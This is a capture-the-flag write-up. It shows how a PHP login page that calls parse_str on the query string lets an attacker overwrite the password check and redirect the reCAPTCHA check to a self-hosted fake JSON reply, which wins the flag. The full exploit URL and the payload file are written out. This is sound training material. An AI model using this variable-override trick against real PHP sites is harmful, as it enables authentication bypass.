## dont bf me - 36 Solves

> Shou uses Recaptcha for his site to make it "safer". 

The point of this challenge is to abuse how ``parse_str`` works.

We are given some php files that show the code running behind the challenge. The two notable files are ``constant.php`` and ``login.php``.

Here is ``constant.php``:

```
<?php
// recaptcha
$PUB_KEY = getenv("PUB_KEY");
$PRIV_KEY = getenv("PRIV_KEY");
$RECAPTCHA_URL = "https://www.google.com/recaptcha/api/siteverify?secret=$PRIV_KEY&response=";

// password
$CORRECT_PASSWORD = getenv("PASSWORD");

// flag
$FLAG = getenv("FLAG");

// bug does not exist if we can't see it
error_reporting(0);
```

We can see that there are some variables set. Here is the login form:

```
<?php
include "constant.php";

parse_str($_SERVER["QUERY_STRING"]);

// check args
if (!isset($password) || !isset($_GET['g-recaptcha-response'])) {
    echo "Missing args :(";
    die();
}

// check recaptcha
$recaptcha_resp = json_decode(file_get_contents($RECAPTCHA_URL.$_GET['g-recaptcha-response']), true);
if(!$recaptcha_resp || !$recaptcha_resp["success"]) {
    echo "Bad recaptcha :(";
    die();
}

if ($recaptcha_resp["score"] < 0.8) {
    echo "Stop! Big hacker";
    die();
}

// check password
if($password == $CORRECT_PASSWORD) {
    echo $FLAG;
} else {
    echo "Wrong password :(";
}
```

The vulnerability is in this line: ``parse_str($_SERVER["QUERY_STRING"]);``. 

You can read up on the vulnerability [here](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#parse_str-variable-override), but essentially we can use the character `&` to reference the variables already in place, and take those values and set them equal to the get parameter values. Additionally, we can re-declare and assign other already-declared variables. Looking at the code, we need to specify a few things in order to bypass all the checks, given that we can access to all the set variables.

First, looking at this line:

```
!isset($password) || !isset($_GET['g-recaptcha-response']
```

There needs to be two url parameters set, ``password`` and ``g-recaptcha-response``. 

Next, let's look at the next two checks.

```
$recaptcha_resp = json_decode(file_get_contents($RECAPTCHA_URL.$_GET['g-recaptcha-response']), true);
if(!$recaptcha_resp || !$recaptcha_resp["success"]) {
    echo "Bad recaptcha :(";
    die();
}

if ($recaptcha_resp["score"] < 0.8) {
    echo "Stop! Big hacker";
    die();
}
```

The first thing to note is this line: ``$RECAPTCHA_URL.$_GET['g-recaptcha-response'])``. This implies that the get param ``g-recaptcha-response`` should be attatched to the recaptch

Ok, the statement ``!$recaptcha_resp`` ensures that the response exists, and ``!$recaptcha_resp["success"]`` ensures that there is a value in the json file that is decoded named success, and that it has a value of true.

The second check looks to see if there is a score entry in the json with a value greater than 0.8. I can create the following payload ``payload.json``. I will host the file on my VPS so that the challenge servers can access it.

```
{"score":1.0, "success":true}
```

In order to make my file accessible, I create an HTTP Server using python. I do this so that you can go to the URL of my VPS and access the json file.

```
root@natem135:~/public# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...                           -
```

Here is my finished payload.

```
http://bfm.ny.ctf.so/login.php?password=&CORRECT_PASSWORD&RECAPTCHA_URL=http://natem135.xyz:8000/payload.json?&g-recaptcha-response=dummy
```

I enter the URL in my browser and I can see on my VPS that a request was recieved from the challenge server:

```
root@natem135:~/public# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...                           -
104.236.23.113 - - [20/Dec/2020 01:24:14] "GET /payload.json?dummy HTTP/1.0" 200
```

And I have the flag!

```
we{f3243131-45e1-4d82-9dfb-586760275ac6@0bvious1y_n0t_a_brutef0rc3_cha11}
```